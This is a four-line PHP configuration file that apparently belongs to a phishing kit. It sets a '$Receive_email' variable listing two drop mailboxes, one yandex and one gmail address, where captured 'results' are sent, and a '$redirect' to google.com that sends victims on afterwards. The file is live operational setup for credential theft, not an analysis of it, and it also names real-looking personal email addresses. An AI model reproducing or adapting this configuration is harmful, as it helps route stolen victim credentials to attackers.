<?php 
$Receive_email="Result2021box@yandex.com,cynthiaenudi@gmail.com";
$redirect="https://www.google.com/";
?>